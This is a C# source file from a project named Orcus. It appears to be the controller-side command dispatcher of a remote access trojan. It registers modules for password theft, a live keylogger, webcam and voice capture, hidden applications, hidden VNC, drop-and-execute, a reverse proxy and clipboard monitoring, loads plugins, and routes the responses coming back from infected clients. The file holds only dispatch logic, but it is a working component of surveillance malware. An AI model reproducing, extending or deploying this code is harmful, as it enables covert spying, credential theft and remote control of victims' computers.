#if DEBUG
using Orcus.Administration.Commands.HVNC;
#endif
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Threading;
using System.Windows;
using NLog;
using Orcus.Administration.Commands.ActiveConnections;
using Orcus.Administration.Commands.Audio;
using Orcus.Administration.Commands.AudioVolumeControl;
using Orcus.Administration.Commands.ClientCommands;
using Orcus.Administration.Commands.ClipboardManager;
using Orcus.Administration.Commands.Code;
using Orcus.Administration.Commands.ComputerInformation;
using Orcus.Administration.Commands.ConnectionInitializer;
using Orcus.Administration.Commands.Console;
using Orcus.Administration.Commands.DeviceManager;
using Orcus.Administration.Commands.DropAndExecute;
using Orcus.Administration.Commands.EventLog;
using Orcus.Administration.Commands.FileExplorer;
using Orcus.Administration.Commands.Fun;
using Orcus.Administration.Commands.HiddenApplication;
using Orcus.Administration.Commands.LiveKeylogger;
using Orcus.Administration.Commands.LivePerformance;
using Orcus.Administration.Commands.MessageBox;
using Orcus.Administration.Commands.Passwords;
using Orcus.Administration.Commands.Registry;
using Orcus.Administration.Commands.RemoteDesktop;
using Orcus.Administration.Commands.ReverseProxy;
using Orcus.Administration.Commands.StartupManager;
using Orcus.Administration.Commands.SystemRestore;
using Orcus.Administration.Commands.TaskManager;
using Orcus.Administration.Commands.TextChat;
using Orcus.Administration.Commands.UninstallPrograms;
using Orcus.Administration.Commands.UserInteraction;
using Orcus.Administration.Commands.VoiceChat;
using Orcus.Administration.Commands.Webcam;
using Orcus.Administration.Commands.WindowManager;
using Orcus.Administration.Commands.WindowsCustomizer;
using Orcus.Administration.Commands.WindowsDrivers;
using Orcus.Administration.Core.Plugins;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Connection;
using Logger = Orcus.Administration.Core.Logging.Logger;
using DisallowMultipleThreadsAttribute = Orcus.Plugins.DisallowMultipleThreadsAttribute;

namespace Orcus.Administration.Core.CommandManagement
{
    public class Commander : ICommander, IDisposable
    {
        private readonly Dictionary<uint, Command> _commandDictionary;
        private readonly Dictionary<Command, object> _lockObjects;
        private readonly object _selectorLock = new object();
        private readonly Dictionary<Command, CommandSettings> _commandSettings;

        public Commander(OnlineClientInformation clientInformation, ConnectionManager connectionManager, Sender sender)
        {
            ConnectionInfo = new ConnectionInfo(clientInformation, sender, connectionManager, this);
            Commands = new List<Command>
            {
                new ConsoleCommand(),
                new FunCommand(),
                new TaskManagerCommand(),
                new PasswordsCommand(),
                new FileExplorerCommand(),
                new MessageBoxCommand(),
                new AudioCommand(),
                new CodeCommand(),
                new RegistryCommand(),
                new ActiveConnectionsCommand(),
                new UninstallProgramsCommand(),
                new EventLogCommand(),
                new ReverseProxyCommand(),
                new WebcamCommand(),
                new AudioVolumeControlCommand(),
                new LivePerformanceCommand(),
                new UserInteractionCommand(),
                new LiveKeyloggerCommand(),
#if DEBUG
                new HvncCommand(),
#endif
                new HiddenApplicationCommand(),
                new StartupManagerCommand(),
                new WindowsCustomizerCommand(),
                new SystemRestoreCommand(),
                new TextChatCommand(),
                new ComputerInformationCommand(),
                new RemoteDesktopCommandLocal(),
                new WindowManagerCommand(),
                new DeviceManagerCommand(),
                new ClientCommandsCommand(),
                new ConnectionInitializerCommand(),
                new VoiceChatCommand(),
                new WindowsDriversCommand(),
                new DropAndExecuteCommand(),
                new ClipboardManagerCommand()
            };

            Commands.AddRange(
                PluginManager.Current.LoadedPlugins.OfType<CommandAndViewPlugin>()
                    .Select(x => (Command) Activator.CreateInstance(x.CommandType)));

            foreach (var plugin in PluginManager.Current.LoadedPlugins.OfType<FactoryCommandPlugin>())
                if (clientInformation.Plugins.FirstOrDefault(x => x.Guid == plugin.PluginInfo.Guid)?.IsLoaded == true)
                    Commands.Add((Command) Activator.CreateInstance(plugin.CommandType));

            Commands.ForEach(x => x.Initialize(ConnectionInfo));
            _commandDictionary = Commands.ToDictionary(x => x.Identifier, y => y);
            _lockObjects = new Dictionary<Command, object>();
            _commandSettings = new Dictionary<Command, CommandSettings>();
        }

        public T GetCommand<T>() where T : Command
        {
            return Commands.OfType<T>().First();
        }

        public void Dispose()
        {
            foreach (var command in Commands)
                command.Dispose();
        }

        public ConnectionInfo ConnectionInfo { get; }
        public List<Command> Commands { get; }

        public void Receive(uint id, byte[] data)
        {
            lock (_selectorLock)
            {
                Command command;
                if (_commandDictionary.TryGetValue(id, out command))
                {
                    var commandSettings = GetCommandSettings(command);
                    if (!commandSettings.AllowMultipleThreads)
                    {
                        using (var autoResetEventHandler = new AutoResetEvent(false))
                        {
                            object lockObject;
                            if (!_lockObjects.TryGetValue(command, out lockObject))
                                _lockObjects.Add(command, lockObject = new object());

                            new Thread(() =>
                            {
                                try
                                {
                                    lock (lockObject)
                                    {
                                        autoResetEventHandler.Set();
                                        command.ResponseReceived(data);
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Logger.Fatal(ex.Message);
                                    LogManager.GetCurrentClassLogger()
                                        .Fatal(ex, "Error when executing command with id " + id);
                                }
                            }).Start();
                            autoResetEventHandler.WaitOne(); //Wait until the command is locked
                        }
                    }
                    else
                        new Thread(() =>
                        {
                            try
                            {
                                command.ResponseReceived(data);
                            }
                            catch (Exception ex)
                            {
                                Logger.Fatal(ex.Message);
                            }
                        }).Start();
                }
                else
                {
                    if (Application.Current != null)
                        Logger.Warn(
                            string.Format(
                                (string) Application.Current.Resources["ReceivedCommandResponseUnknownCommand"],
                                id));
                }
            }
        }

        public string DescribePackage(uint id, byte[] data, bool isReceived)
        {
            Command command;
            if (_commandDictionary.TryGetValue(id, out command))
                return GetCommandDescription(command, data, isReceived);

            return null;
        }

        public static string GetCommandDescription(Command command, byte[] data, bool isReceived)
        {
            var minimumVersionAttribute =
                (DescribeCommandByEnumAttribute)
                    command.GetType().GetCustomAttribute(typeof (DescribeCommandByEnumAttribute));

            string commandDescription;
            if (minimumVersionAttribute != null)
            {
                commandDescription = Enum.ToObject(minimumVersionAttribute.EumType, data[0]).ToString();
            }
            else
                commandDescription = command.DescribePackage(data, isReceived);

            var commandInfo = $"{command.GetType().Name} / ID: {command.Identifier}";
            return string.IsNullOrEmpty(commandDescription)
                ? command.GetType().Namespace + "." + commandInfo
                : commandDescription + " (" + commandInfo + ")";
        }

        internal CommandSettings GetCommandSettings(Command command)
        {
            CommandSettings commandSettings;
            if (!_commandSettings.TryGetValue(command, out commandSettings))
            {
                commandSettings = new CommandSettings();
                var attributes = command.GetType().GetCustomAttributes(true);

                commandSettings.AllowMultipleThreads =
                    attributes.FirstOrDefault(x => x is DisallowMultipleThreadsAttribute) == null;
                commandSettings.Libraries = attributes.OfType<ProvideLibraryAttribute>().Select(x => x.Library).ToList();

                _commandSettings.Add(command, commandSettings);
            }

            return commandSettings;
        }
    }
}